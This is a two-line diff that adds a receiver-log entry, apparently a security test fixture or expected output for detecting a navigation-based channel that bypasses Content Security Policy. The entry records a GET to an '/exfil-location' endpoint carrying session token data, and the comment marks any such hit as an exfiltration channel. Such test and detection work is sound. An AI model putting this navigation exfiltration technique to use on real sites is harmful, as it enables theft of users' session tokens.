@@ -1,0 +1,2 @@
+# Navigation egress receiver hits (any entry = CSP-bypassing exfiltration channel):
+  RECEIVED: GET /exfil-location?d=SESSION.CAP.TOKENS
